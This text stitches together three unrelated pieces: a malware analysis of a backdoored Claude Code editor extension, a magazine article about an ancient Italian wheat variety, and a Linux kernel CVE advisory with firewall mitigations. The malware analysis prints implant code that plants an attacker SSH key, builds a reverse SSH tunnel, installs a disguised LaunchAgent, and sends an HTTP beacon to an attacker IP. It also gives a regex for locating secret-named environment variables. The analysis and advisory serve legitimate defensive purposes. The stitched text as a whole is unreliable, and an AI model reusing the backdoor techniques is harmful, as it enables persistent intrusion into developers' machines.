TL;DR
Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.
Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.

Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.
While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.
The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.
Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.
In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.
Infection Chain
The Cursor Marketplace Extension
The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.
The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.
Stage 1 - Preparing SSH Access
First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.
The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.
var sd = path.join(HOME, ".ssh"),
ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
fs.appendFileSync(ak, PUB + "\n");
d.sshKey = "added"
} else {
d.sshKey = "present"
}
Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).
With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:
- Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.
- macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.
- Windows: tries to install and start OpenSSH Server using PowerShell.
None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.
It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.
A bug in the macOS SSH logic?
On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:
// ...
else if (PLAT === "darwin") {
var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
d.remoteLogin = rl;
if (/Off/i.test(rl)) {
det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
d.remoteLoginOn = "tried"
}
}
Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:
You need administrator access to run this tool... exiting!
systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:
function ex(c, t) {
try {
return cp.execSync(c, {
timeout: t || 3000,
stdio: ["ignore", "pipe", "ignore"],
windowsHide: true
}).toString().trim()
} catch (e) {
return ""
}
}
Because the output is "You need administrator access to run this tool... exiting!", /Off/i.test(rl) evaluates to false.
As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.
This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.
Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.
Stage 2 - Establishing the Reverse SSH Tunnel
Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.
It’s worth keeping the two keys straight during an investigation:
- The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.
- The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.
The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:
var kf = path.join(
TMP,
".stk_" + crypto.createHash("md5")
.update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:
Affected host -- outbound SSH tunnel --> External SSH server
Operator -- separate connection --> Server's allocated port
|
Through the existing tunnel
|
v
Affected host's SSH:22
|
Login using the planted key
Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.
The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.
If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.
Stage 3 - Keeping Access Available
To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:
| Platform | Artifacts | Persistence mechanism | Notes |
|---|---|---|---|
| Linux | ~/.config/.smt, ~/.config/.smtk | Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. | Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below). |
| macOS | ~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plist | Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl. | Runs in the user context rather than as a root LaunchDaemon. |
| Windows | ~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd | Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. | Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login. |
On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.
On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:
<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>
Stage 4 - Host Recon
Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:
- Hostname, username, OS platform, and architecture
- Home directory, current working directory, and global Git email (git config --global user.email)
- Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
- Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i
The environment variable check uses Object.keys(process.env):
Object.keys(process.env)
.filter(function(k) {
return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
})
.slice(0, 40)
Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.
To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.
It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:
var r = http.request({
host: h,
port: p,
path: "/beacon",
method: "POST",
timeout: 3000,
headers: {"content-type": "application/json"}
}, function(res) {
res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()
Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.
The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.
Detection Opportunities
From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.
SSH Key and Configuration Changes
Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.
Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.
While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.
User LaunchAgent Persistence
The persistence setup on macOS gives us a couple of strong signals:
- A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).
- A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).
Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.
SSH Tunnels and Follow-On Access
On the process and network side, look for:
- ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.
- Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).
If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.
Remediation
If you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:
- Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225.
- Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk.
- Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys, delete /tmp/.stk_*, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.
- Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter).

Article
Sometime in the early 1990s, Claudio Grossi, a 40-year-old farmer in Parma, in northern Italy, was cleaning his attic when he turned up an old sack full of seeds that he couldn’t identify. The bag, he was sure, had been left by his late great-grandfather, who’d started the farmstead around 1915. Grossi had no idea how long the seeds had been sitting there, deprived of water, soil and sun. Dry and cracked, the kernels looked so old in the palm of his hand that he doubted anything would ever sprout from them. He carried the bag down the stairs, shook the seeds out into a pile of manure and then forgot about them.
To his surprise, the seeds soon sprouted a few different types of wheat. One was particularly striking: At six feet high, its plants were about twice as tall as commercial wheat. But the most remarkable feature came when it developed ears—the grain-studded parts at the top of the plant. All of the wheat types Grossi had previously seen grew only one such ear. But the tall wheat grew a full seven ears, always in the same pattern: a long one with six shorties bunched up around it like little fingers. Even the kernels themselves were bigger than those of average wheat. And unlike the typical pale-yellow wheat kernels, they came in a rainbow of colors—yellow, black, red, white and even green, sometimes all on the same stem. Grossi, a grain farmer his whole life, had never seen anything like it. “I thought it was a freak of nature,” he says. He couldn’t find a mention of it in agricultural books.
For Grossi, a practicing Catholic, the next insight came from a different book altogether. Leafing through a Bible at church one Sunday, he found a passage in the Book of Genesis describing a stalk with seven ears, in a dream that Joseph interprets for the Pharaoh: “And he slept and dreamed the second time: And, behold, seven ears of grain came up upon one stalk, rank and good. And, behold, seven thin ears and blasted with the east wind sprung up after them. And the seven thin ears devoured the seven rank and full ears.” To Grossi, that sounded just like the mysterious crop in his manure pile.
“I connected the dots,” Grossi says. That grain must be really ancient, he thought. And if people were farming this odd-looking wheat in biblical times, why does no one today?
Back on his farm, Grossi harvested the grain, milled it into flour and baked a loaf of bread in his kitchen. Compared with commercial wheat, the dough didn’t rise well, but as the loaf sat in the oven, it filled the kitchen with a surprisingly nutty and delicious aroma. Once finished, it had a rich, satisfying taste. “You get these notes of sweetness that you can’t find in regular commercial flour,” he says.
Did you know? More miracles of grain in the Bible
- In 2 Kings 4:42-44, Elisha multiplies 20 barley loaves in order to feed 100 men—anticipating Jesus’s “Feeding of the 5,000” in the gospels.
- In 1 Kings 17:8-16, Elisha helps a widow at Zarephath to outlast a drought and famine with only a handful of flour and a little oil.
- In Judges 7:9-15, a Midianite soldier recounts a dream in which a barley loaf tumbles into the camp and overturns a tent. Gideon, the judge and military leader, recognizes the dream as a sign that God will deliver the Midianites into Israel's hands.
- In 2 Kings 4:38-41, during a famine, someone gathers wild gourds and cuts them into a pot of stew. The diners discover that the stew is dangerous and cry out to Elisha. He calls for flour and throws it into the pot—and the stew becomes miraculously safe to eat.
Grossi discovered it had other advantages: It was hardier and more self-sufficient than commercial varieties. It fared better during droughts, growing so tall that it overshadowed the weeds. It didn’t need fertilizer or herbicides. Indeed, it seemed so superior to its industrial cousins that he thought of it no longer as a freak of nature but as a wonder. He dubbed it grano del miracolo—“miracle grain” or “miracle wheat.”
Grossi’s discovery came at just the right time. In Italy in the 1990s, a burgeoning slow-food movement aimed to preserve traditional farming practices and promote natural diets.
Grossi hoped that miracolo could ride this slow-food wave, becoming both a portal to the past and a passage to a future. Perhaps, he thought, miracolo could help other farmers bring back ancient grains, leading the movement that is changing how we make bread, a staple of the human diet. And today, as climate change makes droughts, heat waves and plant disease outbreaks more frequent and intense, a grain that has shown it can fend for itself would help keep that bread on the table.
Farmers began cultivating wheat about 10,000 years ago, in the Fertile Crescent—the area of the Middle East known as the Cradle of Civilization. Thousands of years ago, the hardy and adaptable plant took hold in Europe and Asia. Compared with our modern crops, these ancient wheats were much taller, outperforming other grasses in the field.
Over the millennia, humans bred different varieties of wheat, some yielding less grain and others more. As human populations grew, the strains of wheat that brought plentiful harvests became more desirable. That pattern accelerated amid the upheavals of the early 20th century. By the early 1920s, Italy was still recovering from World War I and unable to grow enough grain to sustain itself; the country was importing roughly a third of its wheat. When fascist leader Benito Mussolini became prime minister in 1922, he launched a campaign to “free the Italian people from the slavery of foreign bread,” by pushing for wheat varieties that yielded greater harvests. The Italian government promoted and planted these “elite” varieties, then distributed the seeds to farmers. Named la Battaglia del Grano, or the Battle of Wheat, this campaign became a global model for agrarian development.
In the United States, wheat harvests were then still plentiful, but not for long: By the early 1930s, amid unprecedented droughts, American farmers found the land was exhausted. The result was the Dust Bowl, during which the previously fertile soils of the Great Plains turned into a desert. American farmers had to look for more drought-resistant varieties that still yielded enough grain.
The midcentury Green Revolution, a movement launched by the American agronomist Norman Borlaug, focused on selective breeding and boosted crop production. This work spread worldwide, feeding countless people. The wheat that was created was indeed more plentiful, yet it came with trade-offs. The petite plants couldn’t always outcompete weeds and were susceptible to disease, so growers used weed killers, fungicides and fertilizer to sustain the crops. Little did they know that these practices would only weaken the health of the soil—while making the wheat even less resilient to changing climate and extreme weather events.
In the 1990s, Grossi sensed that anxiety over wheat harvests was building. That’s why, after he grew wheat from those seeds in the attic, he set out to put the hardy ancient grain back on the table. First, he realized he’d have to solve a big problem: Bread made from the wheat leavened poorly, rising only to fall again. In the early 2000s, he began discussing this challenge with an old local baker who shunned modern machines and still kneaded his dough by hand. The baker was intrigued. The two men started experimenting.
They tried letting the dough rise in smaller batches, using wicker baskets that were taller and helped the dough keep its shape. Soon, the two found another secret: Less kneading made miracolo leaven even better. “The dough was rising, and it was holding its shape,” Grossi says.
One new fan of the bread was Beniamino Perobelli, a student in food science at the University of Parma, who tasted the miracolo bread at a local farmers market and dedicated his undergraduate thesis to investigating its nutritional value. That work bore out what Grossi had already intuited: This wheat was truly ancient—and truly special.
Working with the lab of Teofilo Vamerali, then a professor at the University of Parma, Perobelli determined that the grain was Triticum turgidum—literally “swollen wheat” in Latin. Known in English as “poulard wheat,” it had originally evolved in what today are Turkey, Egypt and other nearby Mediterranean countries. And searching agricultural references, Perobelli found that it had been grown in Italy, too, until farmers shifted toward higher-yield commercial varieties. That solved the mystery of the seed bag stashed away in the attic: It had survived because Grossi’s grandfather saved some of the heritage grains.
The food scientists found that, compared with modern wheats, grano del miracolo was richer in phosphorus and iron. Moreover, to their surprise, they found that T. turgidum had less gluten than modern wheat. And it packed a lot of lysine and tryptophan, the essential amino acids that serve as proteins’ building blocks. It also had more arginine, an amino acid that children need to grow. “The richness of microelements, minerals, and the greater presence of proteins other than gluten were very pleasant surprises,” says Perobelli, now a corporate social responsibility and sustainability manager with Rigoni di Asiago, an Italian company that produces organic fruit spreads, honey and more.
For Grossi, Perobelli’s findings offered scientific proof of his grain’s goodness. He persuaded Molino Grassi, a local organic grain company, to offer the flour to artisanal bakers. Over the next few years, Grossi upped production, so Molino Grassi could sell the flour to restaurants and consumers in Italy and abroad.
By the 2010s, traditional recipes were enjoying a renaissance. So were artisanal bakers and pasta makers, who also became more discerning about which grains they used, says Francesco Sottile, an expert in biodiversity of agrosystems at the University of Palermo.
Ancient grains aren’t necessarily perfect. For example, Grossi has found that miracolo’s height can be a liability—which may be why it fell out of favor with Mussolini. Heavy winds, rains and hail can make the tall stems flip over before the grain ripens, ruining harvests. But Grossi circumvented the problem by planting miracolo with shorter wheat varieties that provide structural support. “I’m quite happy because I developed something that’s like a discovery,” he says.
Relying on a limited number of wheat cultivars, Sottile argues, leaves humanity vulnerable to agricultural disasters: prolonged droughts, extreme heat, new diseases or pests that develop resistance to our chemicals. Diversifying grains reduces the risk—even if some varieties succumb to environmental pressures, others will stand.
Sottile shared an example. “I’m based in Sicily,” he says, where 2024 saw “one of the worst droughts in the last 35 to 40 years.” It was so bad that many commercial wheat growers abandoned their fields in April of that year, realizing they wouldn’t be able to reap the seeds they sowed. Sottile was heartened to see a better fate among smaller-batch farmers who grew heritage grains, more resilient to extreme weather.
“Most of the farmers who were adopting ancient grains, they were able to collect, to harvest,” Sottile says. The world needs more crop biodiversity, he adds—including more ancient grains like grano del miracolo. By the same token, we need more people like Grossi, who, much like the ancient grain he sows, have the tenacity to make a miracle happen.

Overview
Linux's stable kernels shipped a fix on October 11 and 15, 2026 for CVE-2026-98432, a use-after-free in the IPv4 TCP handshake that a remote, unauthenticated peer can reach. The kernel's own CVE Numbering Authority (CNA) scores it CVSS 3.1 9.8, Critical. The fixed releases are 5.10.272, 5.15.223, 6.1.190, 6.6.159, 6.12.113, 6.18.56, 7.2.10, and 7.3, and the bug goes back to Linux 4.4. The upstream fix is a four-line change, but most servers run a distribution's kernel, and as of 5:15 PM CDT, October 31, Ubuntu's tracker still reads "Vulnerable" for its kernel on every release, and Red Hat, which now rates the bug Critical too, lists RHEL 8, 9, and 10 as affected with no fix.
Why it's urgent: the bug sits in code every Linux server runs when it accepts an IPv4 TCP connection, before any application sees the connection. Anthropic, whose researcher reported it, says its Claude model wrote a working proof-of-concept exploit that runs commands as root on "Linux servers with a multipath TCP listener," with no credentials. Go programs open those listeners by default, per the Go Security Team. See the timeline.

How the vulnerability works
When a Linux server accepts a TCP connection, the kernel tracks the half-open handshake in a lightweight "request socket," then creates a full socket once the handshake completes. If the connecting peer's IPv4 header carried options, the kernel keeps them to echo in its replies. The bug: the kernel handed those saved options from the request socket to the new connection without copying them, then freed them immediately when the connection went away, while another CPU could still be reading them to build a handshake reply. Reading freed kernel memory is a use-after-free.
The peer needs no login, and it all happens inside the kernel's handshake handling, before any application code runs. The CNA's scoring notes say the stale data can leak kernel heap memory back to the peer, steer kernel writes out of bounds, or crash the machine. Anthropic says a lost race "only fails the handshake without crashing the whole system, so a determined attacker can retry indefinitely until they succeed."
The fix
Eric Dumazet's commit, "ipv4: free inet_opt and ireq_opt after an RCU grace period," changes two plain kfree() calls to kfree_rcu(), which waits until every reader has finished with the memory before freeing it. Other code paths that replace these options already did that. The commit also fixes the same problem in request-socket migration (net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE program), and says a related IPv6 case "will be addressed in a separate patch."
Which servers are exposed
- Every Linux host that accepts IPv4 TCP connections on an affected kernel: web servers, SSH, databases, load balancers, and Kubernetes nodes. The CNA's notes say the vulnerable path runs "during the TCP handshake, before application authentication."
- Hosts with a multipath TCP (MPTCP) listener first. That's the setup Anthropic's working exploit needs: "Linux servers with a multipath TCP listener." Anthropic hasn't said why that listener matters, and the CVE record doesn't mention MPTCP. A server has one only if an application opens an MPTCP socket, and Go programs do by default: the Go Security Team says "as of Go 1.24, Go programs enable MPTCP by default for listen sockets on Linux." The default follows the go line in the program's go.mod, and applies only where the kernel allows MPTCP (net.mptcp.enabled = 1, as on the Debian 12 kernel we checked; AlmaLinux says it ships MPTCP off). The Go team adds that "the underlying bug is not specific to MPTCP. It is possible that systems with no MPTCP listeners are vulnerable to similar attacks." The check is below.
Red Hat now rates it as the CNA does. It raised the bug from Important (8.1) to Critical (9.8) on October 30, citing "the lack of network prerequisites and the potential for severe system instability." Its bulletin says "Systems accepting inbound TCP connections are most directly exposed."
How to check your systems
Check the kernel
Compare the result with your distribution's status above, not with the upstream version. If the installed kernel is newer than the running one, the fix isn't active until you reboot. Run these on container hosts and Kubernetes nodes, not inside containers: a container reports the host's kernel. We ran them on a Debian 12 host and in a Rocky Linux 9 container.
Check for multipath TCP listeners
ss -M lists only MPTCP sockets, so an empty result means no MPTCP listener. net.mptcp.enabled = 1 alone doesn't create one: an application has to open an MPTCP socket. We tested both with iproute2 6.1 in a Debian 12 container, where ss -Mlnp listed a test MPTCP listener and skipped a plain TCP one beside it. On October 31 it also listed a Go HTTP server whose go.mod says go 1.24, and skipped the same server built with go 1.23.
How to fix
Update the kernel and reboot
Install your distribution's fixed kernel as soon as it ships, then reboot: a kernel update doesn't take effect until the machine boots into it. Reboot container hosts and Kubernetes nodes too. Appliances and cloud images that bundle a kernel need their vendor's update.
On Debian, SUSE Linux Enterprise Server 16.0 and the 15 LTSS releases, openSUSE Leap 16.0, Oracle Linux's UEK kernels, and Amazon Linux 2 and 2023, the fix is out. AlmaLinux's is in its testing repository. On Ubuntu and RHEL, it isn't out yet, as of 5:15 PM CDT, October 31. Watch the trackers linked above. Running a self-built kernel? Move to the fixed stable release for its line.
If you can't patch yet
Red Hat's bulletin and AlmaLinux now publish nftables rules that drop incoming IPv4 TCP packets carrying IP options. Red Hat says its rule "reduces exposure to this vulnerability but cannot fully prevent it." The following is Atlas's interim recommendation, the same rule as AlmaLinux's, based on the CNA's scoring notes, which say the attacking peer supplies IPv4 Record Route or Timestamp options in its SYN. TCP traffic almost never carries IPv4 options legitimately, so dropping TCP packets that have them should cost nothing:
ip hdrlength gt 5 matches any IPv4 header longer than the 20-byte minimum, which only options produce. The rule runs before connection tracking and doesn't touch IPv6 or non-TCP traffic. We tested it in a Debian 12 container: it dropped a SYN carrying a Record Route option, and ordinary TCP connections still worked. We haven't tested it against an exploit, and it doesn't fix the kernel. It lasts until reboot, which is fine if the reboot is into a fixed kernel; remove it with nft delete table ip cve_2026_98432. If your edge firewall can drop IPv4 packets with options, doing it there protects every host behind it.
If you manage the firewall with iptables, this rule does the same job from the raw table, which also runs before connection tracking:
The u32 match reads the IPv4 header-length field, and a value of 6 to 15 means the header carries options. We tested it with iptables 1.8.9, on both its nf_tables and legacy backends, in a Debian 12 container: it dropped a Record Route SYN sent to the host and one routed through it, and ordinary TCP connections still worked. Remove it by running the same command with -D in place of -I; like the nft rule, it lasts until reboot. It needs the kernel's xt_u32 module, which the Debian 12, Ubuntu 22.04 and 24.04, and RHEL 8 kernels include. RHEL 9 and 10 kernels, and their rebuilds, leave it out, so use the nft rule there.
Red Hat's rule hooks input; ours hooks prerouting, so it also drops packets the host routes on to containers. On October 31 we tested it against two pairs of network namespaces. It dropped a Record Route SYN routed between one pair, and never saw one bridged between the other, as AlmaLinux warns: "Traffic between containers on the same host may bypass it." AlmaLinux also says not to use it on networks that rely on CIPSO security labels, which travel in IPv4 options.
Turn off multipath TCP if you don't use it. That removes the setup Anthropic's exploit needs, though not the bug. AlmaLinux's steps:
New MPTCP sockets then fail, and Go programs fall back to plain TCP when they start. The setting is per network namespace, and each new one starts with MPTCP on, so a container keeps it unless you set it there too (Docker: --sysctl net.mptcp.enabled=0). Exploitation status. Anthropic says Claude wrote the exploit "after initial prompting," that it runs "arbitrary commands as root, without any credentials or user interaction" on servers with a multipath TCP listener, and that in its proof of concept "it takes 48 minutes to leak a kernel pointer and another five minutes to reach the shell command execution." Anthropic hasn't published the exploit. Its disclosure policy gives developers 90 days to patch and a further 45 days before Anthropic discusses details beyond a public advisory. Red Hat's bulletin now says the bug could be exploited "to trigger remote code execution." By 5:15 PM CDT on October 31, 36 GitHub repositories referenced the CVE. Most describe themselves as audit or mitigation tooling, among them Ansible roles and a livepatch for AlmaLinux and Rocky Linux. At least six say they include a race trigger or a proof of concept for the use-after-free; the first was created at 7:22 PM on October 29, and the latest at 11:04 AM on October 31. The CVE isn't in CISA's Known Exploited Vulnerabilities catalog as of 5:15 PM CDT. We haven't tested any public proof of concept, and we aren't linking them.
